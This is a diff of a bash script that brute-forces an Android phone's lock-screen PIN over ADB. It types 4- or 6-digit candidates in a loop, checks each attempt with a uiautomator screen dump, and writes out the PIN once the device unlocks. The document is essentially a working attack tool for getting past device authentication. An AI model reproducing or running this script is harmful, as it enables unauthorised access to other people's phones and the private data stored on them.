@@ -1,23 +1,10 @@
-testingpass=123456
-
-
+#############################################
 alias Button='./adbTouch.sh'
 alias Text='adb shell input text '
 alias ScreenOn='adb shell input keyevent 26'
 alias Enter='adb shell input keyevent 66'
-# alias Swipe='adb shell input swipe 500 1000 300 300'
 alias EnterPass='adb shell input keyevent 82'
-
-
-###Testing Lock Status
-UNLOCKED=$(adb shell dumpsys power | grep 'mHoldingDisplaySuspendBlocker' |cut -c 33-37)
-
-
-
-
-
-
-
+#############################################
 ScreenOn
 
 EnterPass
@@ -26,8 +13,6 @@ echo "How much digits you think ?"
 echo "  1) 4 digits"
 echo "  2) 6 digits 2"
  
-
-
 read n
 case $n in
   1)
@@ -40,13 +25,20 @@ if [ True ]
 then
    while [ True ];
 		do
-		sleep 1
-		if [ $UNLOCKED = "false" ] ; then echo Locked; else echo Unlocked with $gen; fi
 		gen=$(($gen-1)) 
 		echo trying $gen
 		Text $gen
 		Enter
-		sleep 3
+		adb shell "rm /sdcard/window_dump.xml" & rm /tmp/view.xml
+                adb pull $(adb shell uiautomator dump | grep -oP '[^ ]+.xml') /tmp/view.xml
+		if cat /tmp/view.xml  |grep -q "Pin"
+                then echo "LOCKED"
+                else 
+                   echo UNLOCKED with $gen 
+                   touch  $gen.is.pin
+                   break
+                fi
+
 done
 fi
 
@@ -60,12 +52,21 @@ if [ True ]
 then
    while [ True ];
                 do
-		sleep 1
                 gen=$(($gen-1)) 
-		echo Tring $gen
+		echo Trying $gen
                 Text $gen
                 Enter
-		if [ $(adb shell dumpsys power | grep 'mHoldingDisplaySuspendBlocker' |cut -c 33-37) = "false" ] ; then echo Locked; else echo Unlocked with $gen; fi
+		adb shell "rm /sdcard/window_dump.xml" & rm /tmp/view.xml
+		adb pull $(adb shell uiautomator dump | grep -oP '[^ ]+.xml') /tmp/view.xml
+		if cat /tmp/view.xml  |grep -q "Pin"
+                then echo "LOCKED"
+                else 
+		   echo UNLOCKED with $gen 
+		   touch  $gen.is.pin
+		   break
+                fi
+ 
+
 done
 fi  
 
@@ -77,5 +78,3 @@ fi
    ./main.sh
 	;;
 esac
-
-
